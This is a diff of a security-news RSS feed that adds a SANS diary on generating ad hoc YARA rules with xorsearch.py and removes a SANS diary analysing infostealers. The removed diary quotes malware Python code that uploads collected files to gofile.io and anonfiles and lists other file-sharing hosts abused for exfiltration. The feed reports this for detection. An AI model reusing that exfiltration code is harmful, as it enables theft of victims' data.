@@ -1,5 +1,149 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 22 Apr 2025 05:59:24 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, April 22nd, 2025 https://isc.sans.edu/podcastdetail/9418</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>ISC Stormcast For Tuesday, April 22nd, 2025 https://isc.sans.edu/podcastdetail/9418, (Tue, Apr 22nd)</title><link>https://isc.sans.edu/diary/rss/31882</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31882</guid></item><item><title>Whistleblower: DOGE Siphoned NLRB Case Data</title><link>https://krebsonsecurity.com/2025/04/whistleblower-doge-siphoned-nlrb-case-data/</link><description>A security architect with the National Labor Relations Board (NLRB) alleges that employees from Elon Musk's Department of Government Efficiency (DOGE) transferred gigabytes of sensitive data from agency case files in early March, using short-lived accounts configured to leave few traces of network activity. The NLRB whistleblower said the unusual large data outflows coincided with multiple blocked login attempts from an Internet address in Russia that tried to use valid credentials for a newly-created DOGE user account.</description><content:encoded>&lt;p&gt;A security architect with the &lt;strong&gt;National Labor Relations Board&lt;/strong&gt; (NLRB) alleges that employees from &lt;strong&gt;Elon Musk&lt;/strong&gt;&amp;#8216;s &lt;strong&gt;Department of Government Efficiency&lt;/strong&gt; (DOGE) transferred gigabytes of sensitive data from agency case files in early March, using short-lived accounts configured to leave few traces of network activity. The NLRB whistleblower said the unusual large data outflows coincided with multiple blocked login attempts from an Internet address in Russia that tried to use valid credentials for a newly-created DOGE user account.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 22 Apr 2025 06:59:28 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>xorsearch.py: "Ad Hoc YARA Rules"</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>xorsearch.py: "Ad Hoc YARA Rules", (Tue, Apr 22nd)</title><link>https://isc.sans.edu/diary/rss/31856</link><description>&lt;p&gt;In diary entry "&lt;a href="https://isc.sans.edu/diary/xorsearchpy&amp;#x2b;Searching&amp;#x2b;With&amp;#x2b;Regexes/31854/"&gt;xorsearch.py: Searching With Regexes&lt;/a&gt;" I showed how one can let &lt;a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/xorsearch.py"&gt;xorsearch.py&lt;/a&gt; generate a YARA rule with a given regular expression.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;In diary entry &amp;quot;&lt;a href="https://isc.sans.edu/diary/xorsearchpy+Searching+With+Regexes/31854/"&gt;xorsearch.py: Searching With Regexes&lt;/a&gt;&amp;quot; I showed how one can let &lt;a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/xorsearch.py"&gt;xorsearch.py&lt;/a&gt; generate a YARA rule with a given regular expression.&lt;/p&gt;
+
+&lt;p&gt;This is a feature in many of my tools that support YARA, and I call it &amp;quot;&lt;a href="https://blog.didierstevens.com/2019/12/31/yara-ad-hoc-rules/"&gt;Ad Hoc Yara Rules&lt;/a&gt;&amp;quot;: rules that are created on the spot with your input.&lt;/p&gt;
+
+&lt;p&gt;Here is the example from my previous diary entry:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-102206.png" style="width: 625px; height: 153px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The regular expression is:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;\d+\.\d+\.\d+\.\d+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It matches one or more digits (\d+) followed by a dot (\.) followed by&amp;nbsp;one or more digits (\d+) followed by a dot (\.)&amp;nbsp;followed by&amp;nbsp;one or more digits (\d+) followed by a dot (\.)&amp;nbsp;followed by&amp;nbsp;one or more digits (\d+).&lt;/p&gt;
+
+&lt;p&gt;To instruct my tool xorsearch.py to generate a YARA rule for this regular expression, one uses the prefix #r#, like this (r stands for regex):&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;#r#\d+\.\d+\.\d+\.\d+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This generates the following YARA rule:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;rule regex {
+
+    strings:
+
+        $a = /\d+\.\d+\.\d+\.\d+/ ascii wide nocase 
+
+    condition:
+
+        $a
+
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The rule uses modifiers ascii, wide and nocase for the regular instruction. Thus the regex will match ASCII and UNICODE strings, regardless of case.&lt;/p&gt;
+
+&lt;p&gt;To view the YARA rule generate by my tools, use option -V (verbose):&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-102807.png" style="width: 677px; height: 171px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;This works for simple strings too, when you use prefix #s#:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-103347.png" style="width: 587px; height: 165px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;And for hexadecimal too, using prefix #x#:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-103645.png" style="width: 551px; height: 155px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you can write your YARA rule in a single line, you can also pass it along as an option using prefix #, like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-104407.png" style="width: 993px; height: 155px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;This uses the following custom YARA rule (it searches for data that starts with ABC) :&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;rule hexadecimal {strings: $x = { 41 42 43 } condition: $x at 0}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you can't write a YARA rule on the command-line (because it is too complex, or you want to use characters that you can't escape), then there are several solutions.&lt;/p&gt;
+
+&lt;p&gt;If you want to use a double-quote character in Windows cmd.exe:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-105202.png" style="width: 993px; height: 297px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;One solution is to use prefix #q# and replace double quotes with single quotes, like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-105502.png" style="width: 993px; height: 155px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The tool will then replace all your single quotes with double quotes.&lt;/p&gt;
+
+&lt;p&gt;For more complex situations, you can use BASE64 and hexadecimal encoding. Encode the complete rule, and pass it along on the command-line in encoded form.&lt;/p&gt;
+
+&lt;p&gt;Take for example my YARA rule &lt;a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/contains_pe_file.yara"&gt;contains_pe_file.yara&lt;/a&gt; that is designed to find PE files in binary data:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-105947.png" style="width: 993px; height: 527px;" /&gt;Converting this rule to BASE64 gives&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;LyoNCiAgVmVyc2lvbiAwLjAuMSAyMDE0LzEyLzEzDQogIFNvdXJjZSBjb2RlIHB1dCBpbiBwdWJsaWMgZG9tYWluIGJ5IERpZGllciBTdGV2ZW5zLCBubyBDb3B5cmlnaHQNCiAgaHR0cHM6Ly9EaWRpZXJTdGV2ZW5zLmNvbQ0KICBVc2UgYXQgeW91ciBvd24gcmlzaw0KDQogIFNob3J0Y29taW5ncywgb3IgdG9kbydzIDstKSA6DQoNCiAgSGlzdG9yeToNCiAgICAyMDE0LzEyLzEzOiBzdGFydA0KICAgIDIwMTQvMTIvMTU6IGRvY3VtZW50YXRpb24NCiovDQoNCnJ1bGUgQ29udGFpbnNfUEVfRmlsZQ0Kew0KICAgIG1ldGE6DQogICAgICAgIGF1dGhvciA9ICJEaWRpZXIgU3RldmVucyAoaHR0cHM6Ly9EaWRpZXJTdGV2ZW5zLmNvbSkiDQogICAgICAgIGRlc2NyaXB0aW9uID0gIkRldGVjdCBhIFBFIGZpbGUgaW5zaWRlIGEgYnl0ZSBzZXF1ZW5jZSINCiAgICAgICAgbWV0aG9kID0gIkZpbmQgc3RyaW5nIE1aIGZvbGxvd2VkIGJ5IHN0cmluZyBQRSBhdCB0aGUgY29ycmVjdCBvZmZzZXQgKEFkZHJlc3NPZk5ld0V4ZUhlYWRlcikiDQogICAgc3RyaW5nczoNCiAgICAgICAgJGEgPSAiTVoiDQogICAgY29uZGl0aW9uOg0KICAgICAgICBmb3IgYW55IGkgaW4gKDEuLiNhKTogKHVpbnQzMihAYVtpXSArIHVpbnQzMihAYVtpXSArIDB4M0MpKSA9PSAweDAwMDA0NTUwKQ0KfQ0K&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;And this can then be used on the command-line like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-110430.png" style="width: 993px; height: 695px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the same can be done when the rule is converted to hexadecimal, by using prefix #h#:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;2f2a0d0a202056657273696f6e20302e302e3120323031342f31322f31330d0a2020536f7572636520636f64652070757420696e207075626c696320646f6d61696e206279204469646965722053746576656e732c206e6f20436f707972696768740d0a202068747470733a2f2f44696469657253746576656e732e636f6d0d0a202055736520617420796f7572206f776e207269736b0d0a0d0a202053686f7274636f6d696e67732c206f7220746f646f2773203b2d29203a0d0a0d0a2020486973746f72793a0d0a20202020323031342f31322f31333a2073746172740d0a20202020323031342f31322f31353a20646f63756d656e746174696f6e0d0a2a2f0d0a0d0a72756c6520436f6e7461696e735f50455f46696c650d0a7b0d0a202020206d6574613a0d0a2020202020202020617574686f72203d20224469646965722053746576656e73202868747470733a2f2f44696469657253746576656e732e636f6d29220d0a20202020202020206465736372697074696f6e203d202244657465637420612050452066696c6520696e73696465206120627974652073657175656e6365220d0a20202020202020206d6574686f64203d202246696e6420737472696e67204d5a20666f6c6c6f77656420627920737472696e672050452061742074686520636f7272656374206f66667365742028416464726573734f664e657745786548656164657229220d0a20202020737472696e67733a0d0a20202020202020202461203d20224d5a220d0a20202020636f6e646974696f6e3a0d0a2020202020202020666f7220616e79206920696e2028312e2e2361293a202875696e7433322840615b695d202b2075696e7433322840615b695d202b20307833432929203d3d2030783030303034353530290d0a7d0d0a&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250421-110710.png" style="width: 993px; height: 695px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;To summarize, the prefixes you can use for Ad Hoc YARA rules are:&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;table border="1" cellpadding="1" cellspacing="1" style="width: 500px;"&gt;
+	&lt;thead&gt;
+		&lt;tr&gt;
+			&lt;th scope="col"&gt;Prefix&lt;/th&gt;
+			&lt;th scope="col"&gt;Explanation&lt;/th&gt;
+		&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#s#&lt;/td&gt;
+			&lt;td&gt;search string (ascii wide nocase)&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#x#&lt;/td&gt;
+			&lt;td&gt;search hexadecimal sequence&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#r#&lt;/td&gt;
+			&lt;td&gt;search regex (ascii wide nocase)&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#&lt;/td&gt;
+			&lt;td&gt;literal YARA rule&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#q#&lt;/td&gt;
+			&lt;td&gt;encoded YARA rule: replaces single quote (') with double quote (&amp;quot;)&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#b#&lt;/td&gt;
+			&lt;td&gt;encoded YARA rule; uses BASE64 to decode&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;#h#&lt;/td&gt;
+			&lt;td&gt;encoded YARA rule; uses hexadecimal to decode&lt;/td&gt;
+		&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;Didier Stevens&lt;br /&gt;
+Senior handler&lt;br /&gt;
+&lt;a href="http://blog.DidierStevens.com"&gt;blog.DidierStevens.com&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31856</guid></item><item><title>ISC Stormcast For Tuesday, April 22nd, 2025 https://isc.sans.edu/podcastdetail/9418, (Tue, Apr 22nd)</title><link>https://isc.sans.edu/diary/rss/31882</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31882</guid></item><item><title>Whistleblower: DOGE Siphoned NLRB Case Data</title><link>https://krebsonsecurity.com/2025/04/whistleblower-doge-siphoned-nlrb-case-data/</link><description>A security architect with the National Labor Relations Board (NLRB) alleges that employees from Elon Musk's Department of Government Efficiency (DOGE) transferred gigabytes of sensitive data from agency case files in early March, using short-lived accounts configured to leave few traces of network activity. The NLRB whistleblower said the unusual large data outflows coincided with multiple blocked login attempts from an Internet address in Russia that tried to use valid credentials for a newly-created DOGE user account.</description><content:encoded>&lt;p&gt;A security architect with the &lt;strong&gt;National Labor Relations Board&lt;/strong&gt; (NLRB) alleges that employees from &lt;strong&gt;Elon Musk&lt;/strong&gt;&amp;#8216;s &lt;strong&gt;Department of Government Efficiency&lt;/strong&gt; (DOGE) transferred gigabytes of sensitive data from agency case files in early March, using short-lived accounts configured to leave few traces of network activity. The NLRB whistleblower said the unusual large data outflows coincided with multiple blocked login attempts from an Internet address in Russia that tried to use valid credentials for a newly-created DOGE user account.&lt;/p&gt;
 &lt;div class="wp-caption aligncenter" id="attachment_71048" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-71048" height="823" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/beruliscomplaint.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-71048"&gt;The cover letter from Berulis&amp;#8217;s whistleblower statement, sent to the leaders of the Senate Select Committee on Intelligence.&lt;/p&gt;&lt;/div&gt;
 &lt;p&gt;The allegations came in an April 14 letter to the Senate Select Committee on Intelligence, signed by &lt;strong&gt;Daniel J. Berulis&lt;/strong&gt;, a 38-year-old security architect at the NLRB.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;NPR&lt;/strong&gt;, which was the &lt;a href="https://www.npr.org/2025/04/15/nx-s1-5355896/doge-nlrb-elon-musk-spacex-security" rel="noopener" target="_blank"&gt;first to report&lt;/a&gt; on Berulis&amp;#8217;s whistleblower complaint, says NLRB is a small, independent federal agency that investigates and adjudicates complaints about unfair labor practices, and stores &amp;#8220;reams of potentially sensitive data, from confidential information about employees who want to form unions to proprietary business information.&amp;#8221;&lt;/p&gt;
@@ -3533,81 +3677,7 @@ version." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK
 &lt;li&gt;ICSA-25-105-08 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-105-08"&gt;ABB M2M Gateway&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;ICSA-25-105-09 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-105-09"&gt;Mitsubishi Electric Europe B.V. smartRTU&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/23255</guid></item><item><title>How to Become a Prompt Engineer</title><link>https://www.techrepublic.com/resource-library/guide/how-to-become-prompt-engineer/</link><description>Organizations of all sizes are searching for qualified prompt engineers. Is this exploding career choice the one for you? Constantly Updated — The download contains the latest and most accurate details. Improve Your Knowledge — This seven-page PDF looks at personality traits, education, experience, and more. Expert Guidance — Written by Mark W. Kaelin through ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/how-to-become-a-prompt-engineer/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>What Kind of Business Should I Start? 5 Factors to Consider</title><link>https://www.techrepublic.com/resource-library/guide/5-factors-for-starting-business/</link><description>New entrepreneurs can use this guide to boost their chances of success when choosing a type of business. Constantly Updated — The download contains the latest and most accurate details. Enhance Your Knowledge — This nine-page PDF looks at budgeting, funding, market demand, and more. Expert Guidance — Written by Madeline Clarke through 20 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/5-factors-for-starting-business/</guid><category>Additional Resources</category><category>Innovation</category><category>Startups</category></item><item><title>Artificial Intelligence vs Machine Learning vs Deep Learning: What’s the Difference?</title><link>https://www.techrepublic.com/resource-library/guide/ai-vs-machine-learning-vs-deep-learning/</link><description>It’s critical that business leaders understand the distinctions as we enter this new era of rapid AI development. Constantly Updated — The download contains the latest and most accurate details. Boost Your Knowledge — This 10-page PDF defines the three terms and compares them to each other to illuminate the similarities and differences. Expert Guidance ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/ai-vs-machine-learning-vs-deep-learning/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>Online Services Again Abused to Exfiltrate Data, (Tue, Apr 15th)</title><link>https://isc.sans.edu/diary/rss/31862</link><description>&lt;p&gt;If Attackers can abuse free online services, they will do for sure&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x21&amp;#x3b; Why spend time to deploy a C2 infrastructure if you have plenty of ways to use "official" services. Not only, they don&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;39&amp;#x3b;t cost any money but the traffic can be hidden in the normal traffic&amp;#x3b; making them more difficult to detect. A very popular one was anonfiles&amp;#x5b;.&amp;#x5d;com. It was so abused that they closed in 2023&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x21&amp;#x3b;&amp;#x5b;&lt;a href="https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/"&gt;1&lt;/a&gt;&amp;#x5d;. A funny fact is that I still see lot of malicious scripts that refer to this domain. Of course, alternatives popped up here and there, like anonfile&amp;#x5b;.&amp;#x5d;la&amp;#x5b;&lt;a href="https://www.anonfile.la/"&gt;2&lt;/a&gt;&amp;#x5d;.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;If Attackers can abuse free online services, they will do for sure! Why spend time to deploy a C2 infrastructure if you have plenty of ways to use &amp;quot;official&amp;quot; services. Not only, they don't cost any money but the traffic can be hidden in the normal traffic; making them more difficult to detect. A very popular one was anonfiles[.]com. It was so abused that they closed in 2023![&lt;a href="https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/"&gt;1&lt;/a&gt;]. A funny fact is that I still see lot of malicious scripts that refer to this domain. Of course, alternatives popped up here and there, like anonfile[.]la[&lt;a href="https://www.anonfile.la/"&gt;2&lt;/a&gt;].&lt;/p&gt;
-
-&lt;p&gt;I spotted some malicious scripts that abuse gofile[.]io[&lt;a href="https://gofile.io/home"&gt;3&lt;/a&gt;], mainly infostealers that exfiltrate collected data through this website. The usage is pretty easy: you request an available server and you post your data:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-def UploadToExternalService(self, path, filename=None) -&amp;gt; str | None:
-    if os.path.isfile(path):
-        Logger.info('Uploading %s to gofile' % (filename or 'file'))
-    with open(path, 'rb') as file:
-        fileBytes = file.read()
-    if filename is None:
-        filename = os.path.basename(path)
-    http = PoolManager(cert_reqs='CERT_NONE')
-    try:
-        server = json.loads(http.request('GET', 'https://api[.]gofile[.]io/getServer').data.decode(errors='ignore'))['data']['server']
-        if server:
-            url = json.loads(http.request('POST', 'https://{}[.]gofile[.]io/uploadFile'.format(server), fields={'file': (filename,     
-&amp;nbsp;                            fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
-            if url:
-                return url
-    except Exception:
-        try:
-            Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
-            url = json.loads(http.request('POST', 'https://api[.]anonfiles[.]com/upload', fields={'file': (filename, 
-&amp;nbsp;                            fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
-            return url
-        except Exception:
-            Logger.error('Failed to upload to anonfiles')
-            return None&lt;/pre&gt;
-
-&lt;p&gt;Note that if the upload to gofile.io failed, they will fallback to anonfiles.com!? Just why? The service is down...&lt;/p&gt;
-
-&lt;p&gt;There are many alternatives to these services. Here is a quick list:&lt;/p&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;transfer[.]sh&lt;/li&gt;
-	&lt;li&gt;
-	&lt;p&gt;www[.]file[.]io&lt;/p&gt;
-	&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;
-	&lt;p&gt;bayfiles[.]com&lt;/p&gt;
-	&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;
-	&lt;p&gt;catbox[.]moe&lt;/p&gt;
-	&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;
-	&lt;p&gt;filebin[.]net&lt;/p&gt;
-	&lt;/li&gt;
-	&lt;li&gt;
-	&lt;p&gt;temp[.]sh&lt;/p&gt;
-	&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Usually, not used in corporate environments, it could be interesting to track hosts that try to resolve these domains!&lt;/p&gt;
-
-&lt;p&gt;[1]&amp;nbsp;&lt;a href="https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/"&gt;https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/&lt;/a&gt;&lt;br /&gt;
-[2]&amp;nbsp;&lt;a href="https://www.anonfile.la/"&gt;https://www.anonfile.la/&lt;/a&gt;&lt;br /&gt;
-[3]&amp;nbsp;&lt;a href="https://gofile.io/home"&gt;https://gofile.io/home&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
-Xameco&lt;br /&gt;
-Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
-&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31862</guid></item><item><title>Trump Revenge Tour Targets Cyber Leaders, Elections</title><link>https://krebsonsecurity.com/2025/04/trump-revenge-tour-targets-cyber-leaders-elections/</link><description>President Trump last week revoked security clearances for Chris Krebs, the former director of the Cybersecurity and Infrastructure Security Agency (CISA) who was fired by Trump after declaring the 2020 election the most secure in U.S. history. The White House memo, which also suspended clearances for other security professionals at Krebs's employer SentinelOne, comes as CISA is facing huge funding and staffing cuts.</description><content:encoded>&lt;p&gt;&lt;strong&gt;President Trump&lt;/strong&gt; last week revoked security clearances for &lt;strong&gt;Chris Krebs&lt;/strong&gt;, the former director of the &lt;strong&gt;Cybersecurity and Infrastructure Security Agency&lt;/strong&gt; (CISA) who was fired by Trump after declaring the 2020 election the most secure in U.S. history. The White House memo, which also suspended clearances for other security professionals at Krebs&amp;#8217;s employer &lt;strong&gt;SentinelOne&lt;/strong&gt;, comes as CISA is facing huge funding and staffing cuts.&lt;/p&gt;
+&lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/23255</guid></item><item><title>How to Become a Prompt Engineer</title><link>https://www.techrepublic.com/resource-library/guide/how-to-become-prompt-engineer/</link><description>Organizations of all sizes are searching for qualified prompt engineers. Is this exploding career choice the one for you? Constantly Updated — The download contains the latest and most accurate details. Improve Your Knowledge — This seven-page PDF looks at personality traits, education, experience, and more. Expert Guidance — Written by Mark W. Kaelin through ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/how-to-become-a-prompt-engineer/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>What Kind of Business Should I Start? 5 Factors to Consider</title><link>https://www.techrepublic.com/resource-library/guide/5-factors-for-starting-business/</link><description>New entrepreneurs can use this guide to boost their chances of success when choosing a type of business. Constantly Updated — The download contains the latest and most accurate details. Enhance Your Knowledge — This nine-page PDF looks at budgeting, funding, market demand, and more. Expert Guidance — Written by Madeline Clarke through 20 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/5-factors-for-starting-business/</guid><category>Additional Resources</category><category>Innovation</category><category>Startups</category></item><item><title>Artificial Intelligence vs Machine Learning vs Deep Learning: What’s the Difference?</title><link>https://www.techrepublic.com/resource-library/guide/ai-vs-machine-learning-vs-deep-learning/</link><description>It’s critical that business leaders understand the distinctions as we enter this new era of rapid AI development. Constantly Updated — The download contains the latest and most accurate details. Boost Your Knowledge — This 10-page PDF defines the three terms and compares them to each other to illuminate the similarities and differences. Expert Guidance ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/ai-vs-machine-learning-vs-deep-learning/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>Trump Revenge Tour Targets Cyber Leaders, Elections</title><link>https://krebsonsecurity.com/2025/04/trump-revenge-tour-targets-cyber-leaders-elections/</link><description>President Trump last week revoked security clearances for Chris Krebs, the former director of the Cybersecurity and Infrastructure Security Agency (CISA) who was fired by Trump after declaring the 2020 election the most secure in U.S. history. The White House memo, which also suspended clearances for other security professionals at Krebs's employer SentinelOne, comes as CISA is facing huge funding and staffing cuts.</description><content:encoded>&lt;p&gt;&lt;strong&gt;President Trump&lt;/strong&gt; last week revoked security clearances for &lt;strong&gt;Chris Krebs&lt;/strong&gt;, the former director of the &lt;strong&gt;Cybersecurity and Infrastructure Security Agency&lt;/strong&gt; (CISA) who was fired by Trump after declaring the 2020 election the most secure in U.S. history. The White House memo, which also suspended clearances for other security professionals at Krebs&amp;#8217;s employer &lt;strong&gt;SentinelOne&lt;/strong&gt;, comes as CISA is facing huge funding and staffing cuts.&lt;/p&gt;
 &lt;div class="wp-caption aligncenter" id="attachment_70987" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70987" height="330" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/chriskrebs-gi.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70987"&gt;Chris Krebs. Image: Getty Images.&lt;/p&gt;&lt;/div&gt;
 &lt;p&gt;The extraordinary &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/04/fact-sheet-president-donald-j-trump-addresses-risks-from-chris-krebs-and-government-censorship/" rel="noopener" target="_blank"&gt;April 9 memo&lt;/a&gt; directs the attorney general to investigate Chris Krebs (no relation), calling him &amp;#8220;a significant bad-faith actor who weaponized and abused his government authority.&amp;#8221;&lt;/p&gt;
 &lt;p&gt;The memo said the inquiry will include &amp;#8220;a comprehensive evaluation of all of CISA&amp;#8217;s activities over the last 6 years and will identify any instances where Krebs&amp;#8217; or CISA&amp;#8217;s conduct appears to be contrary to the administration’s commitment to free speech and ending federal censorship, including whether Krebs’ conduct was contrary to suitability standards for federal employees or involved the unauthorized dissemination of classified information.&amp;#8221;&lt;/p&gt;
